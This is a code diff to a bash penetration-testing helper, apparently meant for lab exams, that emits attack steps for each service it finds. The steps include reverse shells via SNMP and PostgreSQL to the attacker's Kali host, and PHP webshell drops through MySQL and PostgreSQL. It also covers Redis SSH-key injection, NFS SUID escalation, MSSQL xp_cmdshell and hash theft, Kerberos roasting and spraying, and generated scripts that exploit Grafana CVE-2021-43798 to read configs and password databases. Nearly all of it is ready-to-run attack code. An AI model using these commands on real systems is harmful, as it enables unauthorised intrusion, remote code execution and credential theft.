+            "# Reverse shell variant — start listener first, then swap the Command/Args OIDs:" \
+            "#   On Kali: penelope -0 -p 4444" \
+            "#   Swap Command OID to /bin/bash and Args OID to '-c \"bash -i >& /dev/tcp/\${KALI_IP}/4444 0>&1\"'" \
+            "" \
+            "# Step 3b — Cisco/network gear → config TFTP push (read startup-config to Kali tftp):" \
+            "# Start Kali TFTP: sudo atftpd --daemon --port 69 /tmp" \
+            "snmpset -v2c -c '${community}' $ip .1.3.6.1.4.1.9.9.96.1.1.1.1.2.111 i 1 .1.3.6.1.4.1.9.9.96.1.1.1.1.3.111 i 4 .1.3.6.1.4.1.9.9.96.1.1.1.1.4.111 i 1 .1.3.6.1.4.1.9.9.96.1.1.1.1.5.111 a \${KALI_IP} .1.3.6.1.4.1.9.9.96.1.1.1.1.6.111 s 'startup-config' .1.3.6.1.4.1.9.9.96.1.1.1.1.14.111 i 1" \
+            "# Then grep /tmp/startup-config for 'enable secret' / 'username ... secret' lines" \
+            "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §SNMP Follow-Up" \
+            "# TODO: vault §SNMP Follow-Up covers walks only — add writable community primitives (nsExtend, Cisco TFTP push)"
     fi
 
     if grep -qP '^\s*/' "$target_dir/tcp/rpc/nfs_exports.txt" 2>/dev/null; then
@@ -2988,7 +3202,9 @@ generate_next_steps() {
             "cat /mnt/nfs_${ip//./_}/etc/exports 2>/dev/null  # check no_root_squash" \
             "# If no_root_squash: copy SUID bash to share from Kali (as root):" \
             "cp /bin/bash /mnt/nfs_${ip//./_}/tmp/bash && chmod +s /mnt/nfs_${ip//./_}/tmp/bash" \
-            "# Then on target: /tmp/bash -p  → root shell"
+            "# Then on target: /tmp/bash -p  → root shell" \
+            "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §NFS / RPC Follow-Up" \
+            "# TODO: vault has no §NFS-no_root_squash-SUID — document the /bin/bash + chmod +s escalation"
     fi
 
     if grep -qi 'REDIS NO-AUTH' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
@@ -3007,7 +3223,9 @@ generate_next_steps() {
             "ssh-keygen -t rsa -f /tmp/redis_key -N '' && (echo -e '\\n'; cat /tmp/redis_key.pub; echo -e '\\n') > /tmp/redis_pubkey.txt" \
             "redis-cli -h $ip CONFIG SET dir /root/.ssh/ && redis-cli -h $ip CONFIG SET dbfilename authorized_keys" \
             "redis-cli -h $ip SET sshkey \"\$(cat /tmp/redis_pubkey.txt)\" && redis-cli -h $ip BGSAVE" \
-            "ssh -i /tmp/redis_key root@$ip"
+            "ssh -i /tmp/redis_key root@$ip" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
+            "# TODO: vault has no §Redis — add cron/authorized_keys/MODULE LOAD RCE trio"
     fi
 
     if grep -qi 'LDAP anonymous bind' "$target_dir/loot/quick_wins.txt" 2>/dev/null && \
@@ -3019,7 +3237,8 @@ generate_next_steps() {
             "$target_dir/tcp/ldap/naming_contexts.txt contains ${base_dn}" \
             "ldapsearch -x -H ldap://$ip -s base namingContexts" \
             "ldapsearch -x -H ldap://$ip -b '${base_dn}' '(objectClass=*)' | grep -iE 'sAMAccountName|mail|description|memberOf'" \
-            "./adr.sh -d <DOMAIN> -u '' -p '' -dc $ip"
+            "./adr.sh -d <DOMAIN> -u '' -p '' -dc $ip" \
+            "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §LDAP Anonymous Bind Follow-Up"
     fi
 
     local mysql_port
@@ -3037,7 +3256,9 @@ generate_next_steps() {
             "mysql -h $ip -P $mysql_port -u root --password='' -e \"SELECT '<?php system(\\\$_GET[\\\"cmd\\\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\"" \
             "# Then trigger: curl http://$ip/shell.php?cmd=id" \
             "# Read local files:" \
-            "mysql -h $ip -P $mysql_port -u root --password='' -e \"SELECT LOAD_FILE('/etc/passwd');\""
+            "mysql -h $ip -P $mysql_port -u root --password='' -e \"SELECT LOAD_FILE('/etc/passwd');\"" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
+            "# TODO: vault has no §MySQL-RCE — add INTO OUTFILE webshell + LOAD_FILE primitives"
     elif [[ -n "$mysql_port" ]]; then
         append_next_finding "$next_file" \
             "MySQL detected" \
@@ -3045,7 +3266,8 @@ generate_next_steps() {
             "mysql -h $ip -P $mysql_port -u root --password=''" \
             "mysql -h $ip -P $mysql_port -u root" \
             "timeout 10m ./crackr.sh --hydra mysql --target $ip -u root -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
-            "# If time permits and default-passwords came up empty: ./crackr.sh --hydra mysql --target $ip -u root -P /usr/share/wordlists/rockyou.txt"
+            "# If time permits and default-passwords came up empty: ./crackr.sh --hydra mysql --target $ip -u root -P /usr/share/wordlists/rockyou.txt" \
+            "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks"
     fi
 
     local pg_port
@@ -3065,13 +3287,29 @@ generate_next_steps() {
             "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user'" \
             "# Check for superuser (enables COPY TO PROGRAM RCE):" \
             "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c 'SELECT current_setting($$is_superuser$$);'" \
+            "" \
+            "# DECIDE: is_superuser = on → proceed to COPY TO PROGRAM RCE (next block);" \
+            "# DECIDE: is_superuser = off → try non-super file-read primitives first:" \
+            "" \
+            "# Non-super primitive A — pg_read_server_files (works if user has pg_read_server_files role, or CVE-2019-9193 on ≤11.2):" \
+            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"SELECT pg_read_server_files('/etc/passwd');\"" \
+            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"CREATE TABLE t(x text); COPY t FROM '/etc/passwd'; SELECT * FROM t;\"" \
+            "" \
+            "# Non-super primitive B — lo_import (large-object trick, worked on ≤9.4 as any user; later versions need role):" \
+            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"SELECT lo_import('/etc/passwd', 1337); SELECT encode(lo_get(1337), 'escape');\"" \
+            "" \
+            "# DECIDE: primitive A or B returns file contents → target ~/.pgpass / postgresql.conf / pg_hba.conf for creds next;" \
+            "# DECIDE: both fail with 'permission denied' → locked down, pivot to DB-data dump via SELECT on application tables." \
+            "" \
             "# RCE via COPY TO PROGRAM (superuser only):" \
             "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);\"" \
             "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"COPY cmd_exec FROM PROGRAM 'id';\"" \
             "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c 'SELECT * FROM cmd_exec;'" \
             "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"COPY cmd_exec FROM PROGRAM 'bash -c \\\"bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1\\\"';\"" \
             "# Webshell write via COPY TO (needs web root write access):" \
-            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"COPY (SELECT '<?php system(\$_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';\""
+            "PGPASSWORD='$pg_pass' psql -h $ip -p $pg_port -U '$pg_user' -c \"COPY (SELECT '<?php system(\$_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';\"" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
+            "# TODO: vault has no §PostgreSQL-RCE — add COPY TO PROGRAM + superuser check"
     elif [[ -n "$pg_port" ]]; then
         append_next_finding "$next_file" \
             "PostgreSQL detected" \
@@ -3079,7 +3317,8 @@ generate_next_steps() {
             "psql -h $ip -p $pg_port -U postgres" \
             "PGPASSWORD=postgres psql -h $ip -p $pg_port -U postgres -c '\\l'" \
             "timeout 10m ./crackr.sh --hydra postgres --target $ip -u postgres -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
-            "# If time permits and default-passwords came up empty: ./crackr.sh --hydra postgres --target $ip -u postgres -P /usr/share/wordlists/rockyou.txt"
+            "# If time permits and default-passwords came up empty: ./crackr.sh --hydra postgres --target $ip -u postgres -P /usr/share/wordlists/rockyou.txt" \
+            "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks"
     fi
 
     local zt_file
@@ -3090,7 +3329,8 @@ generate_next_steps() {
             "$zt_file contains XFR size" \
             "cat $zt_file" \
             "awk '/^[^;]/ && \$4 ~ /^A$/ {print \$1}' $zt_file | sed 's/\\.\$//'" \
-            "awk '/^[^;]/ && \$4 ~ /^A$/ {print \"$ip \" \$1}' $zt_file | sed 's/\\.\$//' | sudo tee -a /etc/hosts"
+            "awk '/^[^;]/ && \$4 ~ /^A$/ {print \"$ip \" \$1}' $zt_file | sed 's/\\.\$//' | sudo tee -a /etc/hosts" \
+            "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §DNS Follow-Up"
     else
         local dns_port
         dns_port=$(first_detected_port "$target_dir" 'domain|dns|^53/tcp')
@@ -3100,7 +3340,8 @@ generate_next_steps() {
                 "nmap service line includes port ${dns_port}" \
                 "dig @$ip -p $dns_port version.bind chaos txt" \
                 "dig @$ip -p $dns_port <DOMAIN> axfr" \
-                "dnsrecon -d <DOMAIN> -n $ip"
+                "dnsrecon -d <DOMAIN> -n $ip" \
+                "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §DNS Follow-Up"
         fi
     fi
 
@@ -3111,7 +3352,8 @@ generate_next_steps() {
             "$target_dir/udp/snmp/process_args.txt contains credential keywords" \
             "grep -iE 'pass|pwd|secret|key|token|cred|-p[[:space:]]' $target_dir/udp/snmp/process_args.txt" \
             "cat $target_dir/udp/snmp/process_args.txt" \
-            "grep -iE 'mysql|postgres|mssql|ssh|ftp|backup|script' $target_dir/udp/snmp/process_args.txt"
+            "grep -iE 'mysql|postgres|mssql|ssh|ftp|backup|script' $target_dir/udp/snmp/process_args.txt" \
+            "# CHEAT: vault/_CHEATSHEETS/Active_Recon.md §SNMP Follow-Up"
     fi
 
     if is_nonempty_file "$target_dir/udp/snmp/windows_users.txt"; then
@@ -3124,7 +3366,8 @@ generate_next_steps() {
                 "cat $snmp_users_loot" \
                 "./sprayr.sh -U $snmp_users_loot -p 'Password1' -t $ip" \
                 "timeout 10m ./crackr.sh --hydra winrm --target $ip -U $snmp_users_loot -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
-                "# If time permits and default-passwords came up empty: ./crackr.sh --hydra winrm --target $ip -U $snmp_users_loot -P /usr/share/wordlists/rockyou.txt"
+                "# If time permits and default-passwords came up empty: ./crackr.sh --hydra winrm --target $ip -U $snmp_users_loot -P /usr/share/wordlists/rockyou.txt" \
+                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §2.2 Password Spraying"
         fi
     fi
 
@@ -3140,13 +3383,33 @@ generate_next_steps() {
             append_next_finding "$next_file" \
                 "MSSQL login succeeded" \
                 "$target_dir/loot/quick_wins.txt contains MSSQL LOGIN" \
+                "# Step 1 — baseline (version + direct sysadmin check):" \
                 "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port" \
                 "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q 'SELECT @@version; SELECT IS_SRVROLEMEMBER(''sysadmin'');'" \
-                "# Enable xp_cmdshell for RCE (sysadmin required):" \
+                "" \
+                "# Step 2 — impersonation enum (most common low-priv-to-sysadmin path):" \
+                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';\"" \
+                "" \
+                "# DECIDE: column returns 'sa' → impersonate it and confirm sysadmin:" \
+                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin'); REVERT;\"" \
+                "# DECIDE: column returns another principal → try that principal; chain until you land on one with sysadmin;" \
+                "# DECIDE: column empty → check linked servers (step 3) or fall through to step 5 UNC-hash steal." \
+                "" \
+                "# Step 3 — linked server enum (second most common sysadmin-by-proxy path):" \
+                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q 'SELECT srvname, isremote FROM sys.servers;'" \
+                "# DECIDE: linked servers returned → query via OPENQUERY, possibly as remote's login:" \
+                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"SELECT * FROM OPENQUERY([<LINKED_SRV>], 'SELECT @@version; SELECT IS_SRVROLEMEMBER(''sysadmin'');')\"" \
+                "" \
+                "# Step 4 — enable xp_cmdshell for RCE (requires sysadmin from step 1, 2, or 3):" \
                 "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\"" \
                 "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"EXEC xp_cmdshell 'whoami'\"" \
-                "# Steal NetNTLM hash via UNC path (then catch with responder):" \
-                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"EXEC xp_dirtree '\\\\\\\\<KALI_IP>\\\\share'\""
+                "" \
+                "# Step 5 — steal NetNTLM hash via UNC path (any authenticated user, no sysadmin needed):" \
+                "# Start Responder on Kali: sudo responder -I tun0 -wrf" \
+                "impacket-mssqlclient '${mssql_user}:${mssql_pass}@${ip}' -port $mssql_port -q \"EXEC xp_dirtree '\\\\\\\\<KALI_IP>\\\\share'\"" \
+                "# Captured hash → hashcat -m 5600 responder_hash.txt /usr/share/wordlists/rockyou.txt" \
+                "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
+                "# TODO: vault has no §MSSQL-RCE — document xp_cmdshell enable, impersonation chain, linked servers, xp_dirtree relay"
         else
             append_next_finding "$next_file" \
                 "MSSQL detected" \
@@ -3156,7 +3419,8 @@ generate_next_steps() {
                 "impacket-mssqlclient '<USER>:<PASS>@$ip' -port $mssql_port" \
                 "timeout 10m ./crackr.sh --hydra mssql --target $ip -U <users.txt> -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
                 "# If time permits and default-passwords came up empty: ./crackr.sh --hydra mssql --target $ip -U <users.txt> -P /usr/share/wordlists/rockyou.txt" \
-                "nmap --script ms-sql-info,ms-sql-empty-password -p $mssql_port $ip"
+                "nmap --script ms-sql-info,ms-sql-empty-password -p $mssql_port $ip" \
+                "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks"
         fi
     fi
 
@@ -3168,7 +3432,8 @@ generate_next_steps() {
             "nmap service line includes port ${rdp_port}" \
             "netexec rdp $ip -u <USER> -p '<PASS>'" \
             "xfreerdp /v:$ip:$rdp_port /u:<USER> /p:'<PASS>' /cert:ignore" \
-            "nmap --script rdp-enum-encryption,rdp-ntlm-info -p $rdp_port $ip"
+            "nmap --script rdp-enum-encryption,rdp-ntlm-info -p $rdp_port $ip" \
+            "# CHEAT: vault/_TOOLS/rdp.md"
     fi
 
     local kerberos_port
@@ -3187,15 +3452,41 @@ generate_next_steps() {
                 "# AS-REP roast accounts with UF_DONT_REQUIRE_PREAUTH:" \
                 "impacket-GetNPUsers '<DOMAIN>/' -dc-ip $ip -usersfile $ldap_users_file -no-pass -format hashcat -outputfile $target_dir/loot/asrep_hashes.txt" \
                 "# Crack AS-REP hashes offline (hashcat mode 18200):" \
-                "hashcat -m 18200 $target_dir/loot/asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
+                "hashcat -m 18200 $target_dir/loot/asrep_hashes.txt /usr/share/wordlists/rockyou.txt" \
+                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §2.3 AS-REP Roasting"
         else
             append_next_finding "$next_file" \
                 "Kerberos detected" \
                 "nmap service line includes port ${kerberos_port}" \
                 "nmap --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>' -p $kerberos_port $ip" \
-                "kerbrute userenum --dc $ip -d <DOMAIN> <users.txt>" \
-                "impacket-GetNPUsers '<DOMAIN>/' -dc-ip $ip -usersfile <users.txt> -no-pass -format hashcat" \
-                "impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip $ip -request"
+                "" \
+                "# Step 1 — extract domain from LDAP if present, else set manually:" \
+                "grep -oP 'DC=\\K[^,]+' $target_dir/tcp/ldap/naming_contexts.txt 2>/dev/null | paste -sd. -" \
+                "DOMAIN='<DOMAIN>'   # <-- set from step 1 output or known engagement hint" \
+                "" \
+                "# Step 2 — kerbrute fast pass with real-person names.txt (~10k names, ~2 min against a DC):" \
+                "kerbrute userenum --dc $ip -d \"\$DOMAIN\" /usr/share/seclists/Usernames/Names/names.txt -o $target_dir/loot/kerbrute_raw.txt" \
+                "grep -oP '(?<=VALID USERNAME:\\s)\\S+(?=@)' $target_dir/loot/kerbrute_raw.txt | sort -u > $target_dir/loot/kerbrute_users.txt" \
+                "wc -l $target_dir/loot/kerbrute_users.txt   # count of valid usernames" \
+                "" \
+                "# DECIDE: kerbrute_users.txt has entries → skip step 3, jump to step 4 AS-REP roast;" \
+                "# DECIDE: kerbrute returns no VALID USERNAME lines → users probably aren't real-person-named, fall through to step 3." \
+                "" \
+                "# Step 3 — broad-spectrum fallback (xato 8.3M list; ~30+ min on rate-limited DC, run in tmux):" \
+                "kerbrute userenum --dc $ip -d \"\$DOMAIN\" /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o $target_dir/loot/kerbrute_raw.txt" \
+                "grep -oP '(?<=VALID USERNAME:\\s)\\S+(?=@)' $target_dir/loot/kerbrute_raw.txt | sort -u > $target_dir/loot/kerbrute_users.txt" \
+                "" \
+                "# Step 4 — AS-REP roast against the freshly enumerated users:" \
+                "impacket-GetNPUsers \"\$DOMAIN/\" -dc-ip $ip -usersfile $target_dir/loot/kerbrute_users.txt -no-pass -format hashcat -outputfile $target_dir/loot/asrep_hashes.txt" \
+                "# Step 5 — crack AS-REP hashes offline (hashcat mode 18200):" \
+                "hashcat -m 18200 $target_dir/loot/asrep_hashes.txt /usr/share/wordlists/rockyou.txt" \
+                "" \
+                "# Parallel — kerberoast if you have ANY creds (from spray, leak, or AS-REP crack):" \
+                "impacket-GetUserSPNs \"\$DOMAIN/<USER>:<PASS>\" -dc-ip $ip -request -outputfile $target_dir/loot/tgs_hashes.txt" \
+                "hashcat -m 13100 $target_dir/loot/tgs_hashes.txt /usr/share/wordlists/rockyou.txt" \
+                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §1.4 Kerbrute User Enumeration" \
+                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §2.3 AS-REP Roasting" \
+                "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §2.4 Kerberoasting"
         fi
     fi
 
@@ -3205,7 +3496,8 @@ generate_next_steps() {
             "SMB plus Kerberos/LDAP appears in nmap results" \
             "netexec smb $ip" \
             "netexec smb $ip -u <USER> -p '<PASS>' --shares --users --groups" \
-            "./adr.sh -d <DOMAIN> -u <USER> -p '<PASS>' -dc $ip"
+            "./adr.sh -d <DOMAIN> -u <USER> -p '<PASS>' -dc $ip" \
+            "# CHEAT: vault/_CHEATSHEETS/Active_Directory.md §1 Enumeration"
     fi
 
     local rsync_port
@@ -3216,7 +3508,8 @@ generate_next_steps() {
             "nmap service line includes port ${rsync_port}" \
             "rsync rsync://$ip:$rsync_port/" \
             "nmap --script rsync-list-modules -p $rsync_port $ip" \
-            "rsync -av --timeout=30 rsync://$ip:$rsync_port/<MODULE>/ ./rsync_${ip//./_}_<MODULE>/"
+            "rsync -av --timeout=30 rsync://$ip:$rsync_port/<MODULE>/ ./rsync_${ip//./_}_<MODULE>/" \
+            "# TODO: vault has no §rsync — would cover module listing (rsync rsync://IP/), anonymous module fetch, writable-module upload for webshell drop"
     fi
 
     local vnc_port
@@ -3228,7 +3521,9 @@ generate_next_steps() {
             "nmap --script vnc-info,vnc-title,vnc-brute -p $vnc_port $ip" \
             "vncviewer $ip:$((vnc_port - 5900))" \
             "timeout 10m ./crackr.sh --hydra vnc --target $ip -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" \
-            "# If time permits and default-passwords came up empty: ./crackr.sh --hydra vnc --target $ip -P /usr/share/wordlists/rockyou.txt"
+            "# If time permits and default-passwords came up empty: ./crackr.sh --hydra vnc --target $ip -P /usr/share/wordlists/rockyou.txt" \
+            "# CHEAT: vault/_CHEATSHEETS/Passwords.md §Remote Password Attacks" \
+            "# TODO: vault has no §VNC — add vncviewer + vnc-brute workflow"
     fi
 
     local docker_port
@@ -3240,7 +3535,9 @@ generate_next_steps() {
             "curl -s http://$ip:$docker_port/version | jq . 2>/dev/null || curl -s http://$ip:$docker_port/version" \
             "curl -s http://$ip:$docker_port/containers/json | jq . 2>/dev/null" \
             "docker -H tcp://$ip:$docker_port ps" \
-            "docker -H tcp://$ip:$docker_port run --rm -it -v /:/host alpine chroot /host sh"
+            "docker -H tcp://$ip:$docker_port run --rm -it -v /:/host alpine chroot /host sh" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
+            "# TODO: vault has no §Docker-API-escape — add chroot /host + container escape primitives"
     fi
 
     local kube_port
@@ -3251,7 +3548,9 @@ generate_next_steps() {
             "nmap service line includes port ${kube_port}" \
             "curl -sk https://$ip:$kube_port/version" \
             "curl -sk https://$ip:$kube_port/api/v1/pods" \
-            "kubectl --server=https://$ip:$kube_port --insecure-skip-tls-verify get pods -A"
+            "kubectl --server=https://$ip:$kube_port --insecure-skip-tls-verify get pods -A" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
+            "# TODO: vault has no §Kubernetes — add kubelet /exec + /runningpods enumeration"
     fi
 
     local squid_port
@@ -3262,7 +3561,9 @@ generate_next_steps() {
             "nmap service line includes proxy/Squid or common proxy port ${squid_port}" \
             "curl -x http://$ip:$squid_port -I http://127.0.0.1/" \
             "curl -x http://$ip:$squid_port -I http://$ip/" \
-            "proxychains -q nmap -sT -Pn -p80,443,8080 <INTERNAL_IP>"
+            "proxychains -q nmap -sT -Pn -p80,443,8080 <INTERNAL_IP>" \
+            "# CHEAT: vault/_CHEATSHEETS/Tunneling_Pivoting.md §Post-Pivot Action Chain (nearest match — discovered HTTP proxy = functional pivot)" \
+            "# TODO: vault has no §Squid — would cover proxychains http-proxy config (http vs socks5 in /etc/proxychains4.conf), internal-host enumeration via target-side proxy"
     fi
 
     local tftp_udp=false tftp_tcp_port
@@ -3276,7 +3577,8 @@ generate_next_steps() {
             "nmap UDP/TCP results indicate TFTP on port 69" \
             "nmap -sU --script tftp-enum -p69 $ip" \
             "tftp $ip -c get pxelinux.cfg/default" \
-            "for f in config.txt backup.txt startup-config running-config; do tftp $ip -c get \$f; done"
+            "for f in config.txt backup.txt startup-config running-config; do tftp $ip -c get \$f; done" \
+            "# TODO: vault has no §TFTP — would cover nmap tftp-enum, network-gear config filenames (pxelinux.cfg, startup-config, running-config), read+write semantics, PUT-to-webroot pivot"
     fi
 
     local legacy_port
@@ -3287,7 +3589,8 @@ generate_next_steps() {
             "nmap service line includes rlogin/rexec/rsh or ports 512-514" \
             "nmap --script rusers,rlogin-brute -p $legacy_port $ip" \
             "rlogin -l <USER> $ip" \
-            "rsh -l <USER> $ip id"
+            "rsh -l <USER> $ip id" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §2 Service / Network Path"
     fi
 
     if is_nonempty_file "$target_dir/tcp/ssh/version_info.txt" && \
@@ -3297,7 +3600,8 @@ generate_next_steps() {
             "$target_dir/tcp/ssh/version_info.txt and quick_wins flag old SSH" \
             "cat $target_dir/tcp/ssh/version_info.txt" \
             "ssh-audit $ip" \
-            "searchsploit \"$(head -1 "$target_dir/tcp/ssh/version_info.txt" 2>/dev/null | sed 's/^SSH Version: //')\""
+            "searchsploit \"$(head -1 "$target_dir/tcp/ssh/version_info.txt" 2>/dev/null | sed 's/^SSH Version: //')\"" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §2 Service / Network Path"
     fi
 
     # --- Generic CMS / named-app fingerprint (one stanza, any app) ---
@@ -3310,17 +3614,197 @@ generate_next_steps() {
             [[ -z "$cms_name" || -z "$cms_port" ]] && continue
             local proto="http"
             [[ "$cms_port" == "443" || "$cms_port" == "8443" ]] && proto="https"
-            local cms_query="${cms_name#Title[}"
-            cms_query="${cms_query%]}"
-            cms_query="${cms_query%% *}"
+            # cms_name looks like "Exhibitor", "Exhibitor (Jetty 1.0)" or
+            # "nginx 1.14.2" after the fingerprint rewrite in generate_quick_wins.
+            # Strip any parenthesized server detail so searchsploit gets the
+            # most specific product term. Skip the stanza if nothing useful
+            # survives — prevents junk queries like `searchsploit Error`.
+            local cms_query
+            cms_query=$(echo "$cms_name" | sed -E 's/\s*\([^)]*\)//g' | awk '{$1=$1};1')
+            [[ -z "$cms_query" ]] && continue
             append_next_finding "$next_file" \
                 "Named app on :${cms_port} — ${cms_name}" \
                 "WhatWeb title/plugin on $ip:$cms_port ($target_dir/tcp/http/port_${cms_port}/whatweb.txt)" \
                 "cat $target_dir/tcp/http/port_${cms_port}/whatweb.txt" \
                 "searchsploit \"${cms_query}\"" \
                 "curl -sk ${proto}://$ip:${cms_port}/ | grep -iE 'version|generator|<meta' | head -10" \
-                "for p in /admin /admin/login /login /wp-admin /administrator /user/login /manager/html /console /api /robots.txt /.git/HEAD; do printf '%s %s\\n' \"\$(curl -sk -o /dev/null -w '%{http_code}' ${proto}://$ip:${cms_port}\$p)\" \"\$p\"; done"
+                "for p in /admin /admin/login /login /wp-admin /administrator /user/login /manager/html /console /api /robots.txt /.git/HEAD; do printf '%s %s\\n' \"\$(curl -sk -o /dev/null -w '%{http_code}' ${proto}://$ip:${cms_port}\$p)\" \"\$p\"; done" \
+                "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §3 Web / CMS Path"
         done < <(grep -i '^CMS/app fingerprint' "$target_dir/loot/quick_wins.txt" 2>/dev/null | sort -u)
+    fi
+
+    # --- Grafana :3000 — CVE-2021-43798 path traversal (v8.0.0–8.3.0) ---
+    # Evidence-gated: port 3000 alone is ambiguous (React/Flask/Express dev
+    # servers). Require a Grafana marker in whatweb/curl_headers. Stage the
+    # probe + read scripts to $target_dir/loot/ per AGENTS.md §6 — the
+    # path-traversal loop is exactly the payload shape that belongs in a file.
+    local grafana_port_dir="$target_dir/tcp/http/port_3000"
+    if detected_tcp_port "$target_dir" "3000" && [[ -d "$grafana_port_dir" ]] && \
+        grep -qiE 'grafana|Grafana-[0-9]|grafana_session' \
+            "$grafana_port_dir/whatweb.txt" "$grafana_port_dir/curl_headers.txt" 2>/dev/null; then
+        local grafana_loot="$target_dir/loot"
+        local grafana_probe="$grafana_loot/grafana_cve-2021-43798.probe.sh"
+        local grafana_read="$grafana_loot/grafana_cve-2021-43798.read.sh"
+        mkdir -p "$grafana_loot"
+        cat > "$grafana_probe" <<GRAFANA_PROBE
+#!/bin/bash
+# CVE-2021-43798 Grafana path traversal probe
+# Tries each Grafana plugin slug until /etc/passwd is read unauthenticated.
+# Target baked in at script-generation: http://${ip}:3000
+IP="${ip}"
+for plug in alertlist annolist barchart bargauge cloudwatch dashlist elasticsearch graph heatmap histogram mysql opentsdb pluginlist postgres prometheus stat table text timeseries welcome; do
+    out=\$(curl -sk --path-as-is "http://\${IP}:3000/public/plugins/\${plug}/../../../../../../../../etc/passwd")
+    if echo "\$out" | grep -q '^root:'; then
+        echo "VULN via plugin: \$plug"
+        echo "\$out" | head -5
+        exit 0
+    fi
+done
+echo "No vulnerable plugin slug matched — target is likely >=8.3.1 (patched)."
+exit 1
+GRAFANA_PROBE
+        chmod +x "$grafana_probe" 2>/dev/null || true
+        cat > "$grafana_read" <<GRAFANA_READ
+#!/bin/bash
+# CVE-2021-43798 Grafana config + SQLite DB read (after probe confirms plugin)
+# Usage: bash \$0 <VULN_PLUGIN>
+PLUG="\${1:?Usage: \$0 <VULN_PLUGIN>}"
+IP="${ip}"
+OUT_DIR="$grafana_loot"
+curl -sk --path-as-is "http://\${IP}:3000/public/plugins/\${PLUG}/../../../../../../../../etc/grafana/grafana.ini" -o "\${OUT_DIR}/grafana.ini"
+curl -sk --path-as-is "http://\${IP}:3000/public/plugins/\${PLUG}/../../../../../../../../var/lib/grafana/grafana.db" -o "\${OUT_DIR}/grafana.db"
+echo "Wrote: \${OUT_DIR}/grafana.ini  \${OUT_DIR}/grafana.db"
+if command -v sqlite3 >/dev/null 2>&1 && [[ -s "\${OUT_DIR}/grafana.db" ]]; then
+    echo "--- user table (crack bcrypt hashes with hashcat -m 3200) ---"
+    sqlite3 "\${OUT_DIR}/grafana.db" 'SELECT login,password,salt FROM user;'
+fi
+GRAFANA_READ
+        chmod +x "$grafana_read" 2>/dev/null || true
+        append_next_finding "$next_file" \
+            "Grafana detected on :3000" \
+            "nmap shows :3000 open and $grafana_port_dir fingerprint matched Grafana marker; probe/read scripts staged at $grafana_loot/grafana_cve-2021-43798.*.sh" \
+            "# Step 1 — fingerprint the version (CVE-2021-43798 affects 8.0.0 ≤ v ≤ 8.3.0):" \
